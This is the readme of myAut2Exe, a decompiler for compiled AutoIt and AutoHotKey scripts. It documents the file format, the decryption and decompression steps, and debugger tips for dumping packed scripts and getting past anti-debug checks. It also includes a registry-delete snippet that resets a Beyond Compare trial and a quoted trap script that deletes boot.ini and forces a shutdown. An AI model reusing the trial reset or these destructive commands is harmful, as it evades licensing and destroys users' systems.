myAut2Exe - The Open Source AutoIT Script Decompiler 2.12
=========================================================


*New* full support for AutoIT v3.2.6++ :)


... mmh here's what I merely missed in the 'public sources 3.1.0'
This program is for studying the 'Compiled' AutoIt3 format.

AutoHotKey was developed from AutoIT and so scripts are nearly the same.

Drag the compiled *.exe or *.a3x into the AutoIT Script Decompiler textbox.
To copy text or to enlarge the log window double click on it.



Supported Obfuscators:
'Jos van der Zande AutoIt3 Source Obfuscator v1.0.14 [June 16, 2007]' ,
'Jos van der Zande AutoIt3 Source Obfuscator v1.0.15 [July  1, 2007]' ,
'Jos van der Zande AutoIt3 Source Obfuscator v1.0.20 [Sept  8, 2007]' ,
'Jos van der Zande AutoIt3 Source Obfuscator v1.0.22 [Oct  18, 2007]' ,
'Jos van der Zande AutoIt3 Source Obfuscator v1.0.24 [Feb  15, 2008]' ,
'EncodeIt 2.0' and
'Chr() string encode'


Tested with:

   AutoIT    : v3. 3. 6.1
   AutoIT    : v3. 3. 0.0 and
   AutoIT    : v2.64. 0.0 and
   AutoHotKey: v1. 0.48.5



The options:
===========

'GetCamo's'
   It'll use RegExp to grab the needed camo vectors from the Au3-exe-stub.
   ^- Note that this function only works if the target is unpacked. 
   So if it's packed with Upx or other packer just unpack or dump the Exe from memory(via LordPE or Procdump). 
   The dump don't need to be runable or contain the script. 
   Just use the dump file to get the camo vectors and then select the real script file.

'Force Old Script Type'
   Grey means auto detect and is the best in most cases. However if auto detection fails
   or is fooled through modification try to enable/disable this setting

'Don't delete temp files (compressed script)'
   this will keep *.pak files you may try to unpack manually with'LZSS.exe' as well as *.tok DeTokeniser files, tidy backups and *.tbl (<-Used in van Zande obfucation).
   
   If enable it will keep AHK-Scripts as they are and doesn't remove the linebreaks
   at the beginning
   Default:OFF

'Verbose LogOutput'
   When checked you get verbose information when decompiling(DeTokenise) new 3.2.6+ compiled Exe
      
      If greyed the detokeniser will show and extra window with colored output.
      ^- I really don't recommand to enable this
      Alpha, slow, useless and will stop at 32768 item due to some stupid VB-Limitation.
      (I stop developing this - well it was thought as a tokeneditor and module for other projects as for the 
      ioncube decompiler - to make some small changes to the php bytecode - and write them back ...)
   
   Default:OFF

'Restore Includes'
   will separated/restore includes.
   requires ';<AUT2EXE INCLUDE-START' comment to be present in the script to work
   Default:ON

'Use 'normal' Au3_Signature to find start of script'
   Will uses the normal 16-byte start signature to detect the start of a script
   often this signature was modified or is used for a fake script that is
   just attached to distract & mislead a decompiler.
   When off it scans for the 'FILE' as encrypted text to find the start of a script
   Default:OFF

'Start Offset to Script Data'
  Here you can manually specify the offset were the script starts.
  Normally you should leave that field blank so myAutToExe does that job for you.
  
  (Indeep that option is pretty useless. The only case it can usefull is if
  there are multiple fake scripts. A la "Hacker. Nice try, but wrong :)" +
  You know the exact ScriptOffset and so you can directly extract it without
  the longer way with these *.stub or *.overlay files)
  Default:<empty>

Options in the 'ScriptStart' frame
  These settings are more or less important to find the start of script.
  You can set 'Start Offset to Script Data' to manually override this settings.

Options in the 'ScriptBody XORKey's' frame
  These are really essential for decrypting the script. Of course changing them out 
  of the blue makes no sense. Incase the script+interpreter was treated by 
  AutoIt3Camo or other 'custom modifications' changing these value might be necessary.
  Incase you know(or guessed) the exact AutoIT version you may compare the original
  interpreter stub 'Aut2Exe\AutoItSC.bin' with the one from script.
  When you see in the Compare differences like in the original there is a 
  'PUSH    18EE' and in the script it's 
  'PUSH    254F194'
  then it's probably good to change the standard value from 18EE to 254F194.
  (And to do this for the other values as well) to get the script decrypted
  finally decompiled.
  More details in the AutoIt3Camo-sections
  
  
'FILE-decryptionKey
  Incase the FILE-decryption key was changed you may enter it here. 
  (Together with 'Start Offset to Script Data' that is advanced stuff you may probaly don't need to touch - or to understand...)
  So how to know this? Well you may have unpacked/dumped the script exe-stub found out the exact original version, downloaded the original from the  AutoIT site archive and now compare the original stub aka AutoItSC.bin with your dumped one(or more in detail the .text section after you applied LordPE PE-split) and now noticed that in then original there is somewhere
  'EE 18' and in your script there is '34 12' - so well in this case you may enter this box '1234'. Now if you unchecked 'Use 'normal' Au3_Signature to find start of script' myAutToExe might find the beginning of the script.
  Also this option has only effect on AutoIt3.26++ scripts.
  Default:18EE
  
'Lookup Passwordhash'
   Copies current password hash to clipboard and launches
   http://md5cracker.de
   to find the password of this hash.

   I notice that site don't loads properly when the Firefox addin
   'Firebug' is enabled. Disable it if you've problems
   620AA3997A6973D7F1E8E4B67546E0F6 => cw2k

   ... you may also get an offline MD5 Cracker and paste the hash there like
   DECRYPT.V2  Brute-Force MD5 Cracker
   http://www.freewarecorner.de/download.php?id=7298
   http://www.freewarecorner.de/edecrypt_brute_force_md5_cracker-Download-7298.html


Tools
=====
   'Regular Expression Renamer'
     With is you can manually (de)obfuscate function or variable names.
     
     enabling the ‘simple’ mode button allows you to do mass search'n'relace like this:
    "\$gStr0001" -> ""LITE""
    "\$gStr0002" -> ""td""
    "\$gStr0003" -> ""If checked, ML Bot enables a specific username as Administrator.""
    …
    (^- create this in an editor with some more or less intelligent Search’n’Replace steps)
     


   'Function Renamer'
      If you decompiled a file that was obfuscated all variable and function got lost.

      Is 'Function Renamer' to transfer the function names from one simulare file to
      your decompiled au3-file.

      A simulare file can be a included 'include files' but can be also an older version
      of the script with intact names or some already recoved + manual improved with
      more meaningful function names.

      Bot files are shown side by side seperated by their functions
      Here some example:

      > myScript_decompiled.au3    | > ...AutoIt3\autoit-v3.1.0\Include\Date.au3
      ...                          |  ...
      Func Fn0020($Arg00, $Arg01)  |  Func _DateMonthOfYear($iMonthNum, $iShort)
         Local $Arr0000[0x000D]    |   ;========================================
         $Arr0000[1] = "January"   |   ; Local Constant/Variable Declaration Sec
         $Arr0000[2] = "February"  |   ;========================================
         $Arr0000[3] = "March"     |   Local $aMonthOfYear[13]
         $Arr0000[4] = "April"     |
      ...                          |   $aMonthOfYear[1] = "January"
                                   |   $aMonthOfYear[2] = "February"
                                   |   $aMonthOfYear[3] = "March"
                                   |   $aMonthOfYear[4] = "April"
                                   |  ...
      Both function match with a doubleclick or enter you can add them to the search'n'replace
      list. That will replace 'Fn0020 with '_DateMonthOfYear'.

      So after you associate all functionNames of an include file you can delete these functions and
      replace them with for ex. #include <Date.au3>

      Hint for best matching of includes look at the version properties of the au3.exe
      download/install(unpack) that version from

      http://www.autoitscript.com/autoit3/files/beta/autoit/
      and
      http://www.autoitscript.com/autoit3/files/archive/autoit/

      and use the include from there.

   'Seperate includes of *.au3'
      Good for already decompiled *.au3

   'GetAutoItVersion'
      

CommandLine:
===========

   Ah yes to open a file you may also pass it via command line like this
   myAutToExe.exe "C:\Program Files\Example.exe" -> myAutToExe.exe "%1"
   So you may associate exe file with myAutToExe.exe to decompile them with a right click.

   To run myAutToExe from other tools these options maybe helpful
   options:
   /q    will quit myAutToExe when it is finished
   /s    [required /q to be enable] RunSilent will completly hide myAutToExe



The myAutToExe 'FileZoo'
------------------------
 *.stub     incase there is data before a script it's saved to a *.stub file
 *.overlay  saves data that follows after the end of a script
 ^-- you may try to drag these again into the decompiler

 *.raw   raw encrypted & compressed scriptdata
         (Check that this data has a high entrophy/ i.e. look chaotic)
 *.pak   decrypted put packed dat (use LZSS.exe to unpack this)
 *.tok   AutoIt Tokenfile (use myAutToExe to transform this into an au3 File)

 *.au3  
 *.tbl   Contains ScriptStrings - Goes together with an VanZande-obfucated script.


Files
=====

 myAutToExe.exe     Compiled (pCode) VB6-Exe
 data\RanRot_MT.dll      RanRot & Mersenne Twister pRandom Generator - used to decrypt scriptdata
 data\LZSS.exe           Called after to decryption to decompress the script
 data\ExtractExeIcon.exe Used to extract the MainIcon(s) from the ScriptExe
 
 Doc\               Additional document about decompiling related stuff
 data\Tidy\              is run after deobfucating to apply indent to the source code
 samples\           Useful 'protected' example scripts; use myAut2Exe to reveal its the sources
 src_AutToExe_VB6.vbp   VB6-ProjectFile
 !SourceCode\src\             VB6 source code
 !SourceCode\Au3-Extracter Script 0.2\ AutoIT Script to decompile a *.au3-exe or *.a3x
 !SourceCode\SRC RanRot_MT.dll - Mersenne Twister & RanRot\       C source code for RanRot_MT.dll
 !SourceCode\SRC LZSS.exe\          C++ source code for lzss.exe


Known bugs:
-----------
* myAutToExe does no real UTF8 converting. Well now at least scripts with chinese text string work.
  But if there is somewhere some 'RawBinaryString' like $RawData = "??#$?%H" 
  this string data will get corrupted. 

  Workaround: To fix that open the file in SCiTE and choose
    File/Encoding/UTF8 and save it(may change sth to be able to save the file) or remove
    in a Hexeditor the first three Bytes of the script which is called the BOM-Marker.
    But doing so will 'damage' any chinese text strings.
    Hehe so I hope you don't have any scripts with chinese text strings AND RawBinaryString. ;)
  
  Anyway i'm somehow fed up with that char conventing crap. Well myAutToExe uses the WinAPI
  WideCharToMultiByte(GetACP(),...) before saving the file. For more details look into 
  SourceCode files (and especially into UTF8.bas) :) Please contact me if you know something
  to improve that.


* On Asian system (Chinese, Japan...) that have DBCS(Double Chars Set) enable
  maAutToExe will not run properly (as maybe other VB6 programs).
  Background: To handle binary data I use strings + the functions
  Chr() and Asc() to turn value it into a ACCII char and back. An example:
  At 'normal' systems Chr(Asc(163)) will give back 163, but on DBCS you get 0. If anyone knows a
  workaround, or like to help me to get a Asian windows rip for testing tell me.


* Situation: Even on the test scripts you get:
  Calculating ADLER32 checksum from decrypted scriptdata
   FAILED!
   Calculate ADLER32: 0521D9DD
   CRC from script  : 0C62DA02
   
   -> Fix from http://board.defcon5.biz/viewtopic.php?p=9255#p9255
   The const 'LocaleID_ENG' in the source code is German LCID (1031). 
   I changed it to 1055 (Turkish). 
   LCID list -> http://support.microsoft.com/?kbid=221435. Now it works. 
   Also, the 0 and 1024 LCID's work too.

Narrowing down problems/Finding the bug:
----------------------------------------

In case sth don't work as expected enable 'Don't delete temp files (compressed script)' so tempfiles remain
Of course also have a look at the log-file.
In that order files are processed created:
*.exe -> *.ico                                                                  Icon extractor
      -> *.pak  -> *.[tok | au3 | ahk | * {<-Files bundled with fileinstall}]   LZSS unpacker
                -> *.Tok -> *.au3                                               MyAuTExe.Detokeniser
                -> *.au3 -> *.au3                                               Tidy.exe
                         -> *.au3 + *.tbl -> *.au3                              MyAuTExe.Deobfuscator
(Note most 'unstable' part is the deobfuscator so if you got some real weird script it's probably because 
the deobfuscator failed)


If you don't have VB6 installed use 'src_AutToExe_VBA.doc' for active monitoring & debugging...


Packed Scripts (ArmaDillo)
--------------------------

...sinc--e ArmaDillo is able to also treat overlay data the scriptdata are also compressed so the decompiler will not work directly.
So you need to dump the uncompressed scriptdata from memory first before myAutToExe can proceed it. (In future I may add a dumper module that may do this handle this task - but for now you'll need to do that 'by hand')

Dumping is done like this: Run LauncherGUI.exe and keep it open. Open the LauncherGUI.exe process memory in a hexeditor like Winhex(if there are two processes use the one with the higher PID). There search for 'AU3!EA06' 
Until you find something like that
Offset      0  1  2  3  4  5  6  7   8  9  A  B  C  D  E  F
xxxxxx20   A3 48 4B BE 98 6C 4A A9  99 4C 53 0A 86 D6 48 7D
£HK¾?lJ©™LS.†ÖH}
xxxxxx30   41 55 33 21 45 41 30 36                            AU3!EA06

Search for 'AU3!EA06' again and copy everything into a new file and save it. The 'good' region is always the last one/ after 'AU3!EA06' some 00 should follow.

You may name it *.a3x and so it should be runable as compiled AutoIT script.
(Well here I used Ollydbg for dumping - since I'm used to it, but every good hexeditor you can accomplish the same.)



You may have asked yourself how is it possible, that ArmaDillo don't need to write the uncompressed script data to a file so the AutoIt interpreter will find and access it? Well ArmaDillo simply hooks(intercepts) all API-Calls like Kernel32!CreateFile or Kernel32!ReadFile that LauncherGUI.exe uses and redirects it if need to the uncompressed data in memory.

Some notes to get into ArmaDillo with Olldbg.
   Enable StringOutput(%s%s%s%s%s) Patch 
        -> prevents olly from crash
   BP on CreateMutexA("PID::DAxxxxx") on second hit set EAX=1
        -> Makes ArmaDillo 'think' it is already running the second (debugged - and so 'secured') instance
             
   use Shift+F9 to jump over exceptions; Ctrl+o [exceptions] 'add'

AutoHotKey
----------

   MATE supports AutoHotkey till 1.0.48.05 aka "AHK Classic"
   developed by Chris Mallett (Chris) from 2003 to 2009.

   Beside this there is AutoHotkey 1.1 (aka "AHK_L") maintained by Steve Gray (Lexikos) since 2010
 
   in AHK_L thing got more easier. Just use open the some resource editor or just run 
   7Zip on the exe. You'll find the script like this: 
   <AHK-ExeFile>\.rsrc\RCDATA\>AUTOHOTKEY SCRIPT< (<-I just added support for this in MATE 2.12)
   
   Incase the file is compressed with UPX, MPRESS, THEMIDA or whatever you must of course
   unpack or dump the file.
   
   Dumping the file with 'Process Hacker' is done by selecting the running file
   Properties/Memory. Select all Image(Commit) pages ( normally that is at 0x400000)
   right click on them and select 'Save' to dump the uncompressed data to disk.
 
AutoIt3Camo
-----------

...this does some essential changes of the decryptions values in the interpreter stub
(as well as the AutoIT Compiler that 'compiles' the script).
the options dialog is to easy enter that value after you found them out.
There are two idea to this:

The first is to compare the original interpreter stub 'Aut2Exe\AutoItSC.bin' 
against the one from script.

The second is to compare create a search patterns that will match the the 
decryptions values in the original interpreter stub 'Aut2Exe\AutoItSC.bin' 
as well as in the script treated by AutoIt3Camo.
^-Someday I'll create code that will do that.
Till then here are some practical hints to do that manually.

* First of all you'll need a unpacked script. Means now UPX or Armdillo packed exe.
  It needn't to be runable, we only need unpacked data for the comparison.
  As Tool for dumping(Exe from RAM->HD) I use good old LordPE
  (or Winhex Ram/*.exe and rebuild the exe by drag it into LordPE 
   the important part is 'Options/Rebuilder/Dumpfix' so section VA=>RawOffsets)

* After dumping you my not directly compare DumpedScript.dat with AutoItSC.bin
  instead you'll need to split it up into section (you know this .text, 
  .rdata,... thingys) and then do the compare for each section.
  To split up AutoItSC.bin into section I usually use 7Zip/Extract but for some
  reasons it sometimes don't work so for those causes I use LordPE/Sections/Split
  that requires some more Mouseclicks but does the same
  
* For comparing the .text sections I use the Totalcommander Compare, 
  ExamDiff or Beyond Compare for a quick preview if everthings alright.
  To get a deeper inside into these fancy hexcodes I use Ollydebug.
  Load AutoItSC.bin into Ollydebug, Right Click on ASM; Backup/Load Backup from File
  Now load Script '.text.bin'; now open patches window(Ctrl+p) and you'll see the
  changes. Right Click/Copy/Whole table and paste it in some Editor.
  (now you can easy copy and paste the values in the optionsdialog)
  Comparing the other section you may also use OllyDebug - however I find it more
  comfortable to do it with 'Beyond Compare'

  So that's it.
  Ah yes to start 'Beyond Compare' I use that cmd-script:

reg delete "HKCU\Software\Scooter Software\Beyond Compare 3" /v CacheID /f
start BCompare.exe %*
  
  instead of just run BCompare.exe so it does not expire. This way is even better
  than a crack because it's more simple and also 'compatible' with updates.

The @Compiled macro
-------------------

After you decompiled a script have a look into the log for warnings about the @Compiled macro. And if there are, check out what's going on in the script before you run. Else you might expire surprises like this:

If @Compiled = 0 Then
    $CAN  = "\b"
EndIf
...
If @Compiled = 0 Then
    If $Nitro = 0 Then 
        $ECAN  = "oot.ini"
        _RUNDOS("del D:" & $CAN & $ECAN & " /f /ahs") 
        _RUNDOS("del D:" & $CAN & $ECAN & " /f /ahs") 
        _RUNDOS("del E:" & $CAN & $ECAN & " /f /ahs") 
        _RUNDOS("shutdown -s -f -t 00") 
        Shutdown(5) 
    EndIf
EndIf





The Compiled Script AutoIT File format:
--------------------------------------

AutoIt_Signature        size 0x14 Byte  String "£HK...AU3!"
MD5PassphraseHash       size 0x10 Byte                      [LenKey=FAC1, StrKey=C3D2 AHK only]
ResType                 size 0x4 Byte   eString: "FILE"     [             StrKey=16FA]
ScriptType              eString ">AUTOIT SCRIPT<"           [LenKey=29BC, StrKey=A25E]
CompiledPathName        eString "C:\...\Temp\aut26A.tmp"    [LenKey=29AC, StrKey=F25E]
IsCompressed            size 0x1 Byte
ScriptSize   Compressed size 0x4 Byte                       [XorKey=45AA]
ScriptSize UnCompressed size 0x4 Byte (Note: not useed)     [XorKey=45AA]
ScriptData_CRC          size 0x4 Byte (ADLER32)             [XorKey=C3D2]
CreationTime            size 0x8 Byte (Note: not useed)
LastWrite               size 0x8 Byte (Note: not useed)
Begin of script data    eString "EA05..."
overlaybytes            String
EOF


LenKey => See StringLenKey parameter in decrypt_eString()
StrKey => See StringKey parameter in decrypt_eString()
XorKey => Xor Value with that key


Encrypted String (eString)
================

eString
  Stringlen size 0x4 Byte
  String

decrypt_eString(StringLenKey, StringKey )
    Get32ValueFromFile() => Stringlen
    XOR Stringlen with StringLenKey

    Read string with 'Stringlen' from File

    MT_pseudorandom generator.seed=StringKey
    for each byte in String DO
       Xor byte with (MT_pseudorandom generator.generate31BitValue And &FF)
    next

The pseudorandom generator is call Mersenne Twister thats why MT.
(Version 3.26++ uses instead of MT RanRot what stands for Random Rotation or something like that.).
For that mt.dll ist need. for details see the C source code or Google for 'Mersenne Twister'


Decompressing the Script
========================

FileFormat

Signature   String "EA05" 
UncompressedSize    0x4 Bytes
CompressedData    x Bytes

About the Signature 

"EA05" AutoIt3.00
"EA06" AutoIt3.26++
"JB01" AutoHotKey
"JB01" AutoIT2   -> myAutToExe will change it to "JB00"

AutoHotKey and AutoIT2 are using the same compression signature, but different compression algo's - to recognise them I decided to make myAutToExe to change it to "JB00" incase it's an AutoIT2-script

Compression is a modified LZSS inspired by an article by Charles Bloom.
Lempel Ziv Storer Szymanski (http://de.wikipedia.org/wiki/Lempel-Ziv-Storer-Szymanski-Algorithmus)

Implementation is inside LZSS.dll -> for exact info see C sources

Beside the speculation where this algo comes from here the pseudocode on how it works for AutoIT 2 files which is the most simple version


Proc Decompress (InputfileData, DeCompressedData)
   Signature       = ReadBytes(4)
   Signature == "JB01" ? -> if not Error
   
   UncompressedSize= ReadBytes(4)

   
   while 'decompressed_output' is smaller than 'UncompressedSize' Do
     if ReadBits(1)==1
       // Copy Byte (=8Bit) to output
       WriteOutput (Data:=ReadBits(8), Len:=1)

     else
       BytesToSeekBack = ReadBits(13) +3
       NumOfBytesToCopy= ReadBits(4)  +3
       
       nOffset=(CurrentPosition - BytesToSeekBack)
       
       WriteOutput (Data:=Output[nOffset], Len:=NumOfBytesToCopy)

   end while


Example A:

uncompressable String: "<AUT2EX"
will look like this
{1}<{1}A{1}U{1}T{1}2E{1}X{1}E
Note: '{1}' stands for 1 Bit that is 1
 the algo will stay all the time in that branch
    ...     
     if bit=1                    {or "if bit=0" for version 3.26++}
        // Copy Byte (=8Bit) to output
       writeOutputChar() = ReadBits(8)
     else
        ...


Example B:

uncompressed String: "<EXEabcEXEdef"
  compressed String: "<EXEabc?def"
                             ^ !!! ?
...well 'zoom' in(to bitlevel) in this a little more..
{1}<{1}E{1}X{1}E{1}a{1}b{1}c {0}{00000000000110}{00} {1}d{1}e{1}f
~Nothing special till here~~ ~~~~~ Look below~~~~~~~ ~and again just copy each char to output

{1} 1Bit that is 1 and makes the algo to go into the else branche

{00000000000110} 13 Bits that give represents the Bytes to seek back here it says 6 bytes +3 gives 8:)  ...well slower...
(Remember how to convert binary to decimal? hmm just for the case
 ...0*2^3 + 1*2^2  + 1*2^1 + 0*2^0 = 
    0*8   + 1*4    + 1*2   + 0*1)  =
              4    +   2           = 6 !!)
BytesToSeekBack=6  (sorry for leaving out the +3 6+3=8) 
-----------------
              
{00}    2 bytes the specify the length here it's 0 +3 = 3 Bytes (since 3 is the minimum of repeated chars the algo cares about)
NumOfBytesToCopy=3
------------------

  Reverse Offset   :  6543210
  compressed String: <EXEabc*def
                      \_____^

uncompressed String: <EXEabcEXEdef

-------------------------------------------------------------------

That is the newer version called adaptive Huffmann.
It is used for AutoIT3 files.
What changed there is that the bit size of
'NumOfBytesToCopy' is variable that may improves slightly the compression ratio.

Proc Decompress (InputfileData, DeCompressedData)
   Signature       = ReadBytes(4)
   UncompressedSize= ReadBytes(4)
   Compare with "EA05"       {"EA06"}


   while 'decompressed_output' is smaller than 'UncompressedSize' Do

     if ReadBits(1)==0                {or "if bit=0" for version 3.26++}
       // Copy Byte (=8Bit) to output
       writeOutputChar() = ReadBits(8)

     else
       BytesToSeekBack = ReadBits(16)
       NumOfBytesToCopy= GetNumOfBytesToCopy()

       nOffset=(CurrentPosition - BytesToSeekBack)
       WriteOutput (Data:=Output[nOffset], Len:=NumOfBytesToCopy)

   end while
End Proc

Function NumOfBytesToCopy()

      size = GetBits(2): SizePlus = &H0
      If size = 3 Then

         size = GetBits(3): SizePlus = &H3
         If size = 7 Then

            size = GetBits(5): SizePlus = &HA
            If size = &H1F Then

               size = GetBits(8): SizePlus = &H29
               If size = &HFF Then

                  size = GetBits(8): SizePlus = &H128
                  Do While size = &HFF
                     size = GetBits(8): SizePlus = SizePlus + &HFF
                  Loop

               End If
            End If
         End If
      End If

   Return (size + SizePlus + 3)
End Function

Example A:

uncompr.String: "<AUT2EX"
will look like this{0}<{0}A{0}U{0}T{0}2E{0}X{0}E
Note: '{0}' stands for 1 Bit that is 0

Example B:

uncompr.String: "<EXEabcEXEdef"
Reverse Offset:   7643210

{0}<{0}E{0}X{0}E{0}a{0}b{0}c {1}{0000000000000110}{00} {0}d{0}e{0}f
~Nothing special till here~~ ~~~~~ Look below ~~~~~~~~ ~and again just copy each char to output

{1} 1Bit that is 1 and makes the algo to go into the else branche
{0000000000000110} 15 Bits that give represents the Bytes to seek back here it says 6 bytes
{00}    2 bytes the specify the length here it's 0 +3 = 3 Bytes (since 3 is the minimum of repeated chars the algo cares about)


Version differences:

Version 2_00
   Seek to the very end of the script and then back to read
   Script_Start_Offset     size 0x4 Byte

Version 3_0
   Seek to the very end of the script and then back to read
   Script_Start_Offset     size 0x4 Byte
   Script_CRC32_CRC        size 0x4 Byte                       [XorKey=0xAAAAAAAA]

   Compare Script_CRC32_CRC with Calulated one from dataScript_Start_Offset to Script_End_Offset-4.
   And seek to Script_Start_Offset reach start of script

Version 3_1
   Seek to the very end of the script and then back to read
   Script_End_Offset       size 0x4 Byte                       [XorKey=0xAAAAAAAA]
   Script_Start_Offset     size 0x4 Byte                       [XorKey=0xAAAAAAAA]
   Script_ADLER32_CRC      size 0x4 Byte                       [XorKey=0xAAAAAAAA]

   Compare Script_ADLER32_CRC with Calulated one from dataScript_Start_Offset to Script_End_Offset.
   Seek to Script_Start_Offset and read
   RandomFillData_len      size 0x4 Byte                       [XorKey=0xADAC]
   Then seek over RandomFillData_len to reach start of script

Version 3_2
   Seek to the very end of the script and then back to read
   if "AU3!EA05" is found there
   search entire script for AutoIT Signature to reach start of script

Version 3_26
   same as Version 3_2, expect that here it's "AU3!EA06"

History
=======

2.12 Resetbutton for OptionsDialog
     Reload/Cancel Menuitems
     more Tooltiptext's for OptionsDialog
     improved extracting *.tbl file from obfucated script
     Bugfix in 'FindScriptStart'
     improved Winhex support
     Updated tidy
     implemented 'seperate includefiles' for AHK-File
     added function "GetCamo's"
	 Support for new AHK_L Files

2.11 Added OptionsDialog
     added Winhex to better check, whats going on at offsets.


2.10 Tools\GetAutoItVersion
     added LocalID BugFix
     Minor bugfixes / isTextFile function; better errorhandling(very limited support for negative fileoffsets for the Filestreamclass)
     updated Tidy & au3.api
     added 'Please choose a script locations' form that comes up, if there are more than one possible script start location
     GUI Updates - show Tidy process
     Created DeCompilerConfig.bas for better configuation
     bugfix DeObfuscater (DeObfuscate_VanZande1_0_15; FnNameLoadTBL & FnNameHexToString...
     

2.9 Support for AHK v1.0.48.5 'N/A'-files
    Added HexToBin Binary parser
    Added ProgressBar and a Cancel operation with ESC
    Added 'Keep Functions' option to function renamer
    Improved speed and accuracy of 'Apply' in function renamer
    Added 'simple mode' option button to RegExp Renamer Module
    better support for PE64 exe's
    Redirected Tidy console output into myAutToExe
    bugfix Detokeniser last 4 digits of Int64 got truncated
    Recompiled lzss.exe - hopefully that will fix the bug(0xc0000018)in Win7
    Skip button for Tidy
    BugFix for #NoAutoIt3Execute files (">>>AUTOIT NO CMDEXECUTE<<<")
    ExtractExeIcon.exe No ErrorMessageBoxes when in Comandline mode
    ExtractExeIcon.exe Fixed Bug - did not always extract the first icon
    Added support for modified password length xor key - to better come along with AHK - HotkeyCamo files
    function renamer module: some support of Globals Consts

2.8 Added support for AHK 1.0.48.3 'N/A'-files
    Bugfix Problems with StrConv() if computer region setting were rumanian or other(and not german)
    Remove linebreaks at the begin of AHK-files
    Seperate includes of AHK-scripts
    Bugfix in AHK-Extra decrypt function
    Bugfix vanZandeDeObfuscator strings inside SHELLEXECUTE() got lost

    colorfull output of detokeniser in verbose-mode
    Remove linebreaks at the begin of AHK-files
    Seperate includes of AHK-scripts
    Bugfix in AHK-Extra decrypt function

2.7 Added AutoAdd and search in includes to function renamer
    Added RegExp Renamer Module
    Added AHK-KeyFinder for better support of modified AutoHotKey scripts
    Added EndOfExeStub heuristic to FindStartOfScriptAlternative 
    Improved CheckScriptFor_COMPILED_Macro
    Improved speed & quality of van Zande Deobfuscator


2.6  Fixed Int64-comma bug & 'double'-bug in detokeniser
     Warning msgbox on CRC errors
     _myAutToExe.log is now saved always in the same dir as the mainscript
     
2.5  Added support for 1.0.24.23'-Deobfuscator
     Added support for 'Chr()'-Deobfuscator
     Improved detokiser output - so now there should be no errors because
       some lines got longer than 4096 bytes because of whitespaces
     Removed src_AutToExe_VBA.doc (since I decided to discontinue it)
     some other small bugfixes and sourcecode cleanup's
     Added support for AutoIT2 files(updated LZSS.exe)

2.4  Bugfix for AHK scripts (now AHK extra substraction decryption key is calculated correct)

2.3  Added script icon extractor
     Added creation of *.stub file if needed
     Textbox to manually specify the start of a script
     Improved van Zande 1.0.24'-Deobfuscator

2.2  improved function renamer module
     Bugfix: FileNames are also converted to UTF-8
     Updated myAutToExe VBA-Version.

2.1  added function renamer module
     Output is done in UTF-8 to have a normal Accii file while also retaining unicode chars
     bugfix:  in detokener with strings that were long than 4096 byte
     lowered limit for too long script lines from 2000 to 1800 and improved linecutter
     Detection for 'van Zande 1.0.24'-Deobfuscator added

2.01 Bugfix in 'van Zande 1.0.14'-Deobfuscator
     DeTokeniser will take care about unicode strings int the way that
     the highbyte is not just padded with 00 (especially important for DBCS-string / used for chinese)

2.00 Improved commandline handling + ne options /q /s
     options are saved
     BugFix: Van Zande DeObfucator (problem with strings that contained keywords like "LOCALhost")

1.94 Add 'Log Verbose' Checkbox, Bugfixes and speed optimisation in deobfucator
     Delete of tmp & tidybackups-files by default

1.93 fixed Bug with AutoHotKey: v1.0.46 scripts

1.92 Support for Obfuscator v1.0.22

1.91 Support for AHK Scripts of the Type "<" and ">"

1.9  Finally full support for AutoIT v3.2.6++ files

1.81 BugFix: password checksum got invalid for new Aut3 files because of 'äöü'(ACCI bigger 7f)-fix

1.8 Added: Support for au3 v3.2.6 + TokenFile
    BugFix: scripts with passwords like 'äöü'(ACCI bigger 7f) were not corrected decrypted

1.71 Bug fix: output name contained '>' that result in an invalid output filename

1.7 Bug fixes and improvement in 'Includes separator module'
    Added support for old (EA04) AutoIT Scripts

1.6 Added: Includes separator module

1.5 Added: deObfuscator support for so other version of 'AutoIt3 Source Obfuscator'
    Bug fixes and Extracting Performance improved
    Added: Au3-Extract_Script 0.2.au3

1.4 Added: deObfuscator Module for older version of 'AutoIt3 Source Obfuscator'

1.3 Added: File Extractor Module
    Added: deObfuscator Module
        'AutoIt3 Source Obfuscator v1.0.15' and EncodeIt 2.0

1.2 added support for AutoHotKey Scripts
    replaced LZSS.dll by LZSS.exe
    added decompression support for EA05-autoit files to LZSS.exe

1.1 added this readme + MS-Word VBA Version
    Output *.overlay if overlay is more than 8 byte

1.0 initial Version

<cw2k[ät]gmx.de>        http://board.deioncube.in/showthread.php?tid=29
                        http://deioncube.in/files/MyAutToExe/
                        http://myAutToExe2.tk



























========= OutTakes (from previous Versions) =================

Sorry Decryptions for new au3 Files is not implemented yet.
(...and so you can't extract files whose source you don't have.)
(->Scroll to the very end of this file for OllyDebug DIY-dumping infos)

But you can test the TokenDecompiler that is already finished!

Try Sample\AutoIt316_TokenFile\TokenTestFile_Extracted.au3 - or

DIY:
1. add this line at the beginning of the your au3-sourcecode:

FileInstall('>>>AUTOIT SCRIPT<<<', @ScriptDir & '\ExtractedSource.au3')

2. Compile it with the AutoIt3Compiler.
3. Run the exe -> 'ExtractedSource.au3' get's extracted.
4. Now open 'ExtractedSource.au3' with this decompiler.


Temporary Lastminute appendix....


Well for all the ollydebug'ers a very sloppy how to dump da script to overcome them.

Dumping a Autoit3 3.2.6 Script
==============================

1. ----------------------------
Proc ExtractScript
   push ">>>AUTOIT SCRIPT<<<"
   Call ...
   ...
   XOR     EBX, 0A685
   ...
   Ret
step out of this Function(ret)

2.--------------------------------------------------
until here
$+00      Call ExtractScript
Scroll down until you see something like that
...
$+BE     >|.  E8 8A020000   |CALL    00406F3D
$+C3     >|.  EB 04         |JMP     SHORT 00406CB9
$+C5     >|>  8B5C24 10     |/MOV     EBX, [ESP+10]
$+C9     >|>  8B4424 0C     | /MOV     EAX, [ESP+C]
$+CD     >|.  03C3          |||ADD     EAX, EBX
$+CF     >|.  0FB638        |||MOVZX   EDI, [BYTE EAX]
$+D2     >|.  FF4424 0C     |||INC     [DWORD ESP+C]
$+D6     >|.  8D7424 30     |||LEA     ESI, [ESP+30]
$+DA     >|.  897C24 20     |||MOV     [ESP+20], EDI
$+DE     >|.  E8 23820000   |||CALL    0040EEF6
$+E3     >|.  8B4424 38     |||MOV     EAX, [ESP+38]
$+E7     >|.  83F8 0F       |||CMP     EAX, 0F                       ;  Switch (cases 0..1F)
$+EA     >|.  77 16         |||JA      SHORT 00406CF2
$+EC     >|.  8B4424 0C     |||MOV     EAX, [ESP+C]                  ;  Cases 0,1,2,3,4,5,6,7,8,9,A,B,C,D,E,F of switch 00406CD7
$+F0     >|.  03D8          |||ADD     EBX, EAX
$+F2     >|.  8B03          |||MOV     EAX, [EBX]

3.--------------------------------------------------
